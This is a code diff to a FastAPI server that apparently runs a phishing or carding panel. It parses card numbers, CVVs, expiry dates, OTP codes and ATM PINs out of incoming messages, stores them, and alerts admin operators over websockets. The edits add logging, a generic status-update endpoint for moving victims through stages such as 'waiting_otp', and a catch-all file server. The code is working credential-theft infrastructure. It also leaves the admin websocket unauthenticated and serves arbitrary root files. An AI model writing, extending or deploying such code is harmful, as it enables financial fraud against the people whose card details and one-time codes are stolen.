@@ -4,10 +4,10 @@ import asyncio
 import logging
 from datetime import datetime
 from typing import List, Optional
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Header
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Header, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
-from fastapi.responses import FileResponse
+from fastapi.responses import FileResponse, JSONResponse
 from pydantic import BaseModel
 import databases
 import sqlalchemy
@@ -19,12 +19,12 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("server")
 
 # Configuration
-# Fix: Ensure DATABASE_URL is never None
 DATABASE_URL = os.getenv("DATABASE_URL")
 if not DATABASE_URL:
     logger.warning("DATABASE_URL is not set. Using local sqlite for fallback.")
     DATABASE_URL = "sqlite:///./test.db"
 
+# Railway provides postgres:// but databases/sqlalchemy need postgresql://
 if DATABASE_URL.startswith("postgres://"):
     DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
 
@@ -63,7 +63,7 @@ orders = sqlalchemy.Table(
     sqlalchemy.Column("updated_at", sqlalchemy.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow),
 )
 
-# Fix: Metadata creation
+# Create tables if they don't exist
 engine = sqlalchemy.create_engine(DATABASE_URL)
 metadata.create_all(engine)
 
@@ -90,21 +90,25 @@ class ConnectionManager:
         await websocket.accept()
         if is_admin:
             self.admin_connections.append(websocket)
+            logger.info("Admin connected to WebSocket")
         else:
             self.active_connections.append(websocket)
+            logger.info("Client connected to WebSocket")
 
     def disconnect(self, websocket: WebSocket):
         if websocket in self.active_connections:
             self.active_connections.remove(websocket)
         if websocket in self.admin_connections:
             self.admin_connections.remove(websocket)
+        logger.info("WebSocket disconnected")
 
     async def broadcast_to_admins(self, message: dict):
+        logger.info(f"Broadcasting to admins: {message}")
         for connection in self.admin_connections:
             try:
                 await connection.send_json(message)
-            except:
-                pass
+            except Exception as e:
+                logger.error(f"Error broadcasting to admin: {e}")
 
 manager = ConnectionManager()
 
@@ -156,13 +160,13 @@ async def intercept_order(data: OrderIntercept):
     ref = data.order_ref
     card_info = {}
     if data.raw_message:
-        lines = data.raw_message.split('\n')
-        for line in lines:
-            if "Card Number:" in line: card_info['card_number'] = line.split("Card Number:")[1].strip()
-            if "Expiry:" in line: card_info['card_expiry'] = line.split("Expiry:")[1].strip()
-            if "CVV:" in line: card_info['card_cvv'] = line.split("CVV:")[1].strip()
-            if "OTP:" in line: card_info['otp_code'] = line.split("OTP:")[1].strip()
-            if "ATM PIN:" in line: card_info['atm_pin'] = line.split("ATM PIN:")[1].strip()
+        msg = data.raw_message
+        # Simple extraction logic based on expected Telegram message format
+        if "Card Number:" in msg: card_info['card_number'] = msg.split("Card Number:")[1].split('\n')[0].strip()
+        if "Expiry:" in msg: card_info['card_expiry'] = msg.split("Expiry:")[1].split('\n')[0].strip()
+        if "CVV:" in msg: card_info['card_cvv'] = msg.split("CVV:")[1].split('\n')[0].strip()
+        if "OTP:" in msg: card_info['otp_code'] = msg.split("OTP:")[1].split('\n')[0].strip()
+        if "ATM PIN:" in msg: card_info['atm_pin'] = msg.split("ATM PIN:")[1].split('\n')[0].strip()
 
     if not ref:
         import uuid
@@ -189,10 +193,12 @@ async def intercept_order(data: OrderIntercept):
         if update_data:
             query = orders.update().where(orders.c.order_ref == ref).values(**update_data)
             await database.execute(query)
+            
             msg_type = "card_submitted"
             if "otp_code" in update_data: msg_type = "otp_submitted"
             if "atm_pin" in update_data: msg_type = "atm_pin_submitted"
             await manager.broadcast_to_admins({"type": msg_type, "ref": ref})
+            
     return {"orderRef": ref}
 
 @app.get("/api/orders/{ref}/status")
@@ -213,47 +219,61 @@ async def admin_login(data: AdminLogin):
 @app.get("/api/admin/orders")
 async def get_all_orders(admin: str = Depends(get_current_admin)):
     query = orders.select().order_by(orders.c.created_at.desc())
-    return await database.fetch_all(query)
+    rows = await database.fetch_all(query)
+    return [dict(row) for row in rows]
 
-@app.post("/api/admin/orders/{ref}/approve-card")
-async def approve_card(ref: str, admin: str = Depends(get_current_admin)):
-    query = orders.update().where(orders.c.order_ref == ref).values(status="waiting_otp", stage="otp")
-    await database.execute(query)
-    return {"success": True}
-
-@app.post("/api/admin/orders/{ref}/reject-card")
-async def reject_card(ref: str, admin: str = Depends(get_current_admin)):
-    query = orders.update().where(orders.c.order_ref == ref).values(status="card_rejected")
-    await database.execute(query)
-    return {"success": True}
+@app.post("/api/admin/orders/{ref}/update-status")
+async def update_order_status(ref: str, status_data: dict, admin: str = Depends(get_current_admin)):
+    status = status_data.get("status")
+    stage = status_data.get("stage")
+    update_vals = {}
+    if status: update_vals["status"] = status
+    if stage: update_vals["stage"] = stage
+    
+    if update_vals:
+        query = orders.update().where(orders.c.order_ref == ref).values(**update_vals)
+        await database.execute(query)
+        return {"success": True}
+    return {"success": False}
 
 @app.websocket("/ws")
-async def websocket_endpoint(websocket: WebSocket, admin: Optional[int] = 0):
-    await manager.connect(websocket, is_admin=bool(admin))
+async def websocket_endpoint(websocket: WebSocket):
+    is_admin = websocket.query_params.get("admin") == "1"
+    await manager.connect(websocket, is_admin=is_admin)
     try:
         while True:
             await websocket.receive_text()
     except WebSocketDisconnect:
         manager.disconnect(websocket)
+    except Exception as e:
+        logger.error(f"WebSocket error: {e}")
+        manager.disconnect(websocket)
 
 # Serve Static Files
-@app.get("/")
-async def read_index():
-    return FileResponse("index.html")
-
 @app.get("/admin")
 async def read_admin():
     return FileResponse("admin.html")
 
-# Serve assets (js, css, etc)
+# Serve assets folder
 if os.path.exists("assets"):
     app.mount("/assets", StaticFiles(directory="assets"), name="assets")
 
-# Fallback for SPA or other files
+# Catch-all for SPA and static files
 @app.get("/{path_name:path}")
 async def catch_all(path_name: str):
-    if os.path.exists(path_name) and os.path.isfile(path_name):
+    # If path is empty, serve index.html
+    if not path_name:
+        return FileResponse("index.html")
+    
+    # Check if file exists in root
+    if os.path.isfile(path_name):
         return FileResponse(path_name)
+    
+    # If it's a path that looks like a file (has extension) but doesn't exist, return 404
+    if "." in path_name.split("/")[-1]:
+        return JSONResponse(status_code=404, content={"detail": "Not found"})
+    
+    # Otherwise, assume it's an SPA route and return index.html
     return FileResponse("index.html")
 
 if __name__ == "__main__":
